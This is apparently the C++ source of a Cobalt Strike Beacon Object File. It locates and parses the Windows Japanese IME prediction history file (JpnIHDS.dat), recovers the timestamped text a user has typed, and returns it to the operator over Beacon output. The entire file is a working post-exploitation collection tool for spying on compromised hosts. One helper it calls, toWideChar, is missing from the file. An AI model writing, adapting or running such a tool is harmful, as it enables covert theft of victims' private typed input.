#define _WIN32_WINNT 0x06000000 // For Mingw

#include <windows.h>
#include <shlobj.h>

extern "C" {
	#include "beacon.h"
}

#define BOF_REDECLARE(mod, func) extern "C" __declspec(dllimport) decltype(func) mod ## $ ## func 
#define BOF_LOCAL(mod, func) decltype(func) * func = mod ## $ ## func

#pragma pack(push, 1)

typedef struct IMPPRED_HEADER {
    unsigned long long Timestamp;
    DWORD dwAllocatedSize;
    DWORD dwFlags;
    DWORD dwEntryCount;
    DWORD dwConst_0x20;
    DWORD dwUnk1; // 
    DWORD dwUsedSize;
} IMPPRED_HEADER;

typedef struct IMPPRED_SENTENCE {
    unsigned long long Timestamp;
    WORD dwSubSize;
    WORD wConst_0x10;
    BYTE bConst_0x01;
    BYTE bSubEntryCount;
    WORD wConst_0x00;
} IMPPRED_SENTENCE;

typedef struct IMPPRED_SUBSTITUTION {
    WORD dwSizeOfThisStruct;
	BYTE nInputLen;
    BYTE nResultLen;
    DWORD dwFlags;
    //WCHAR wsText[ANYSIZE_ARRAY]; // WCHAR[nInputLen] + WCHAR[nResultLen]
} IMPPRED_SUBSTITUTION;

static_assert(sizeof(IMPPRED_SENTENCE) == 16, "invalid align");

#pragma pack(pop)

BOF_REDECLARE(KERNEL32, WideCharToMultiByte);
BOF_REDECLARE(KERNEL32, ReadFile);
BOF_REDECLARE(KERNEL32, CreateFileW);
BOF_REDECLARE(KERNEL32, CloseHandle);
BOF_REDECLARE(KERNEL32, FileTimeToSystemTime);
BOF_REDECLARE(SHELL32, SHGetKnownFolderPath);
BOF_REDECLARE(NTDLL, memcpy);
BOF_REDECLARE(KERNEL32, lstrcatW);
BOF_REDECLARE(KERNEL32, lstrlenW);
BOF_REDECLARE(KERNEL32, GetLastError);

BOOL toAnsiChar(LPCWCH lpWideCharStr, LPSTR lpMultiByteStr, int cbMultiByte)
{
	BOF_LOCAL(KERNEL32, WideCharToMultiByte);
	//
    int res = WideCharToMultiByte(CP_UTF8, 0, lpWideCharStr, -1, 0, 0, 0, 0);
    if (res == -1 || res >= cbMultiByte)
        return FALSE;
    WideCharToMultiByte(CP_UTF8, 0, lpWideCharStr, -1, lpMultiByteStr, cbMultiByte, 0, 0);
    return TRUE;
}

extern "C" void go(char* args, int alen) {
	BOF_LOCAL(KERNEL32, ReadFile);
	BOF_LOCAL(KERNEL32, CreateFileW);
	BOF_LOCAL(KERNEL32, CloseHandle);
	BOF_LOCAL(KERNEL32, FileTimeToSystemTime);
	BOF_LOCAL(SHELL32, SHGetKnownFolderPath);
	BOF_LOCAL(NTDLL, memcpy);
	BOF_LOCAL(KERNEL32, lstrcatW);
	BOF_LOCAL(KERNEL32, lstrlenW);
	BOF_LOCAL(KERNEL32, GetLastError);
	//
	WCHAR szFilePath[MAX_PATH];
	if (alen < 6) { // Default alen is 5 and args value is "null". Why? ...
		GUID local_FOLDERID_RoamingAppData = { 0x3EB685DB, 0x65F9, 0x4CF6, 0xA0, 0x3A, 0xE3, 0xEF, 0x65, 0x72, 0x9F, 0x3D };
	 
		PWSTR appdate;
		HRESULT result;
		if ((result = SHGetKnownFolderPath(local_FOLDERID_RoamingAppData, 0, 0, &appdate)) != ((HRESULT)0L)) {
			BeaconPrintf(CALLBACK_ERROR, "[JpnIHDS] SHGetKnownFolderPath failed hresult=%08x\n", result);
			return;
		}  

		memcpy(szFilePath, appdate, lstrlenW(appdate) * 2 + 2);
		lstrcatW(szFilePath, L"\\Microsoft\\InputMethod\\Shared\\JpnIHDS.dat");	
	} else {
		toWideChar(args, szFilePath, MAX_PATH);
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[JpnIHDS] Target File: %S\n", szFilePath);
    HANDLE hFile = CreateFileW(szFilePath, FILE_READ_ACCESS, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[JpnIHDS] CreateFileW failed lasterror=%08x\n", GetLastError());
        return;
    }

    IMPPRED_HEADER header;
    DWORD dwReaded;
    ReadFile(hFile, &header, sizeof(IMPPRED_HEADER), &dwReaded, 0);

    formatp fmt;
    BeaconFormatAlloc(&fmt, 0x10000);

    for (DWORD i = 0; i < header.dwEntryCount; i++) {
        IMPPRED_SENTENCE sentence;
        ReadFile(hFile, &sentence, sizeof(IMPPRED_SENTENCE), &dwReaded, 0);

        FILETIME ft;
        ft.dwLowDateTime = (DWORD)sentence.Timestamp;
        ft.dwHighDateTime = (DWORD)(sentence.Timestamp >> 32);

        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);
        BeaconFormatPrintf(&fmt, "%04i.%02i.%02i %02i:%02i:%02i ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

        for (int j = 0; j < sentence.bSubEntryCount; j++) {
            IMPPRED_SUBSTITUTION substitution;
            ReadFile(hFile, &substitution, sizeof(IMPPRED_SUBSTITUTION), &dwReaded, 0);

            CHAR szInputText[256];
            WCHAR wsInputText[256];
            ReadFile(hFile, wsInputText, substitution.nInputLen * 2, &dwReaded, 0);
            wsInputText[substitution.nInputLen] = 0;
            toAnsiChar(wsInputText, szInputText, sizeof(szInputText));

            WCHAR wsResultText[256];
            CHAR szResultText[256];
            ReadFile(hFile, wsResultText, substitution.nResultLen * 2, &dwReaded, 0);
            wsResultText[substitution.nResultLen] = 0;
            toAnsiChar(wsResultText, szResultText, sizeof(szResultText));

            if (substitution.nResultLen == 0)
                BeaconFormatPrintf(&fmt, "%s", szInputText);
            else
                BeaconFormatPrintf(&fmt, "%s", szResultText);
        }
        BeaconFormatPrintf(&fmt, "\n");
		
		if (fmt.size - fmt.length < 1024) {
			int datasize;
			char* pdata = BeaconFormatToString(&fmt, &datasize);
			BeaconOutput(CALLBACK_OUTPUT_UTF8, pdata, datasize);	
			
			BeaconFormatReset(&fmt);
		}
    }
    CloseHandle(hFile);

	if (fmt.length > 0) {
		int datasize;
		char* pdata = BeaconFormatToString(&fmt, &datasize);
		BeaconOutput(CALLBACK_OUTPUT_UTF8, pdata, datasize);
	}

    BeaconFormatFree(&fmt);

    BeaconPrintf(CALLBACK_OUTPUT, "[JpnIHDS] Task Complete!\n");
}
